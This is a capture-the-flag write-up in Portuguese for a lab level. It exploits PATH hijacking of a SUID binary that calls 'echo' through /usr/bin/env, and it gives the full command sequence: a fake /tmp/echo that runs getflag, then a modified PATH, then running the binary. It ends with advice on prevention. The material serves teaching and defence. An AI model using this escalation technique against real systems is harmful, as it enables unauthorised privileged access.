# 𝕃𝕖𝕧𝕖𝕝 𝟘𝟛

## 🎯 Objetivo
O objetivo deste nível é escalar privilégios aproveitando-se de um arquivo executável que possui a permissão SUID ativada e que faz chamadas de sistema inseguras.

## 🔍 Análise da Vulnerabilidade

* **Tipo:** *PATH Hijacking* (Sequestro de PATH) / *Insecure Environment Variable Usage* em binário SUID.
* **Arquivo Alvo:** `level03` (Executável ELF 32-bit).
* **Comportamento:** Ao listar as permissões do arquivo com `ls -al`, notamos a flag SUID ativada (`-rwsr-sr-x`). Isso significa que, independentemente de quem execute o programa, ele rodará com os privilégios do dono do arquivo (neste caso, `flag03`).

Inspecionando o binário, descobrimos que ele executa internamente o comando `/usr/bin/env echo Exploit me`. A vulnerabilidade crítica aqui é o uso de um **caminho relativo** para o comando `echo`. Em vez de chamar o caminho absoluto (`/bin/echo`), o programa confia na variável de ambiente `$PATH` do usuário para encontrar onde o executável `echo` está. Como nós controlamos a nossa variável `$PATH`, podemos redirecionar o programa para executar um código malicioso nosso.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Listamos os arquivos e identificamos o executável SUID pertencente ao alvo:
    ```bash
    ls -al
    # Saída: -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
    ```

    Inspecionamos o conteúdo do binário para entender seu comportamento:
    ```bash
    strings level03
    # Saída revela a chamada: /usr/bin/env echo Exploit me
    ```

2.  **Payload:**
    Criamos um arquivo falso chamado `echo` no diretório temporário (`/tmp`), que é o único local onde temos permissão de escrita. Dentro dele, colocamos o comando que queremos que o `flag03` execute para nós.

    ```bash
    cd /tmp
    echo "/bin/getflag" > echo
    chmod 777 echo
    ```
    > Criamos o arquivo e demos permissão total de execução para ele.

3.  **Sequestro do PATH:**
    Alteramos a variável de ambiente `$PATH` para que o sistema procure por executáveis primeiro no diretório `/tmp` antes de procurar nos diretórios padrões do sistema.
    ```bash
    export PATH=/tmp:$PATH
    ```
    > Verificamos a alteração com `which echo`, que agora retorna `/tmp/echo` em vez de `/bin/echo`.

4.  **Execução:**
    Voltamos ao diretório home e executamos o binário vulnerável. Ele tenta chamar o `echo`, mas devido ao nosso PATH modificado, ele executa o nosso script `/tmp/echo` com os privilégios de `flag03`.
    ```bash
    cd /home/user/level03
    ./level03
    ```

## 🚩 Solução / Flag
A execução do binário com o PATH sequestrado nos devolve diretamente o token de acesso. Assim, neste level não é necessário logar na conta (`su flag03`) para rodar o `getflag` manualmente, pois o próprio binário vulnerável já executou o comando com os privilégios elevados.

## 🛡️ Prevenção (Como corrigir)
1. **Uso de Caminhos Absolutos**: Ao programar em C, Bash ou qualquer linguagem que interaja com o sistema operacional, nunca chame binários por caminhos relativos (ex: `echo`, `ls`). Sempre utilize o caminho absoluto (ex: `/bin/echo`, `/bin/ls`).

2. **Sanitização de Ambiente**: Programas com SUID devem limpar ou redefinir variáveis de ambiente críticas (como o `PATH`) logo no início da execução, garantindo que não sejam manipulados pelo usuário que os invoca.
